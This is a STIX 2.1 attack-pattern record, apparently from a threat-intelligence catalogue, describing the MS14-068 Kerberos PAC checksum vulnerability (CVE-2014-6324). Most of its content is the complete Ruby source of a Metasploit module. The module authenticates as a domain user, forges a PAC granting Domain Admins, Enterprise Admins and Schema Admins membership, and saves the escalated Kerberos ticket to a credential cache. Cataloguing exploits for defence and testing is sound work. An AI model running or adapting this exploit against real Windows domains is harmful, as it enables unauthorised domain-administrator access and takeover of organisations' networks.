{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ba881b98-fa1f-4971-88a6-88df14bfc6ee",
    "created": "2024-08-14T16:22:57.175833Z",
    "modified": "2024-08-14T16:22:57.175837Z",
    "name": "MS14-068 Microsoft Kerberos Checksum Validation Vulnerability",
    "description": " This module exploits a vulnerability in the Microsoft Kerberos implementation. The problem exists in the verification of the Privilege Attribute Certificate (PAC) from a Kerberos TGS request, where a domain user may forge a PAC with arbitrary privileges, including Domain Administrator. This module requests a TGT ticket with a forged PAC and exports it to a MIT Kerberos Credential Cache file. It can be loaded on Windows systems with the Mimikatz help. It has been tested successfully on Windows 2008. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/kerberos/ms14_068_kerberos_checksum.rb",
            "external_id": "ms14_068_kerberos_checksum.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6324"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx"
        },
        {
            "source_name": "reference",
            "url": "https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-exploitation-and-defence/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bidord/pykek"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::Kerberos::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'MS14-068 Microsoft Kerberos Checksum Validation Vulnerability',\n      'Description' => %q{\n        This module exploits a vulnerability in the Microsoft Kerberos implementation. The problem\n        exists in the verification of the Privilege Attribute Certificate (PAC) from a Kerberos TGS\n        request, where a domain user may forge a PAC with arbitrary privileges, including\n        Domain Administrator. This module requests a TGT ticket with a forged PAC and exports it to\n        a MIT Kerberos Credential Cache file. It can be loaded on Windows systems with the Mimikatz\n        help. It has been tested successfully on Windows 2008.\n      },\n      'Author' =>\n        [\n          'Tom Maddock', # Vulnerability discovery\n          'Sylvain Monne', # pykek framework and exploit\n          'juan vazquez' # Metasploit module\n        ],\n      'References' =>\n        [\n          ['CVE', '2014-6324'],\n          ['MSB', 'MS14-068'],\n          ['OSVDB', '114751'],\n          ['URL', 'http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx'],\n          ['URL', 'https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-exploitation-and-defence/'],\n          ['URL', 'https://github.com/bidord/pykek'],\n          ['URL', 'https://www.rapid7.com/blog/post/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit']\n        ],\n      'License' => MSF_LICENSE,\n      'DisclosureDate' => '2014-11-18'\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'The Domain User' ], aliases: ['USER']),\n        OptString.new('PASSWORD', [ true, 'The Domain User password' ]),\n        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),\n        OptString.new('USER_SID', [ true, 'The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000'])\n      ])\n  end\n\n  def run\n    print_status(\"Validating options...\")\n\n    unless datastore['USER_SID'] =~ /^S-(\\d+-){6}\\d+$/\n      print_error(\"Invalid USER_SID. Ex: S-1-5-21-1755879683-3641577184-3486455962-1000\")\n      return\n    end\n\n    domain = datastore['DOMAIN'].upcase\n\n    print_status(\"Using domain #{domain}...\")\n\n    user_sid_arr = datastore['USER_SID'].split('-')\n    domain_sid = user_sid_arr[0, user_sid_arr.length - 1].join('-')\n    user_rid = user_sid_arr[user_sid_arr.length - 1].to_i\n\n    checksum_type = Rex::Proto::Kerberos::Crypto::Checksum::RSA_MD5\n    etype = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC\n    encryptor = Rex::Proto::Kerberos::Crypto::Encryption::from_etype(etype)\n    password_digest = encryptor.string_to_key(datastore['PASSWORD'])\n\n    pre_auth = []\n    pre_auth << build_as_pa_time_stamp(key: password_digest, etype: etype)\n    pre_auth << build_pa_pac_request\n    pre_auth\n\n    print_status(\"#{peer} - Sending AS-REQ...\")\n    res = send_request_as(\n      client_name: \"#{datastore['USERNAME']}\",\n      server_name: \"krbtgt/#{domain}\",\n      realm: \"#{domain}\",\n      key: password_digest,\n      pa_data: pre_auth,\n      etype: [etype]\n    )\n\n    unless res.msg_type == Rex::Proto::Kerberos::Model::AS_REP\n      print_warning(\"#{peer} - #{warn_error(res)}\") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR\n      print_error(\"#{peer} - Invalid AS-REP, aborting...\")\n      return\n    end\n\n    print_status(\"#{peer} - Parsing AS-REP...\")\n\n    session_key = extract_session_key(res, password_digest)\n    logon_time = extract_logon_time(res, password_digest)\n    ticket = res.ticket\n\n    pre_auth = []\n    pre_auth << build_pa_pac_request\n\n    groups = [\n      Rex::Proto::Kerberos::Pac::DOMAIN_ADMINS,\n      Rex::Proto::Kerberos::Pac::DOMAIN_USERS,\n      Rex::Proto::Kerberos::Pac::SCHEMA_ADMINISTRATORS,\n      Rex::Proto::Kerberos::Pac::ENTERPRISE_ADMINS,\n      Rex::Proto::Kerberos::Pac::GROUP_POLICY_CREATOR_OWNERS\n    ]\n\n    pac = build_pac(\n      client_name: datastore['USER'],\n      group_ids: groups,\n      domain_id: domain_sid,\n      user_id: user_rid,\n      realm: domain,\n      logon_time: logon_time,\n      checksum_type: checksum_type\n    )\n\n    auth_data = build_pac_authorization_data(pac: pac)\n    sub_key = build_subkey(subkey_type: etype)\n\n    print_status(\"#{peer} - Sending TGS-REQ...\")\n\n    res = send_request_tgs(\n      client_name: datastore['USER'],\n      server_name: \"krbtgt/#{domain}\",\n      realm: domain,\n      session_key: session_key,\n      ticket: ticket,\n      auth_data: auth_data,\n      pa_data: pre_auth,\n      subkey: sub_key\n    )\n\n    unless res.msg_type == Rex::Proto::Kerberos::Model::TGS_REP\n      print_warning(\"#{peer} - #{warn_error(res)}\") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR\n      print_error(\"#{peer} - Invalid TGS-REP, aborting...\")\n      return\n    end\n\n    print_good(\"#{peer} - Valid TGS-Response, extracting credentials...\")\n\n    cache = extract_kerb_creds(res, sub_key.value)\n    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(cache, framework_module: self, host: rhost)\n  end\n\n  def warn_error(res)\n    \"#{res.error_code}\"\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-11-18"
}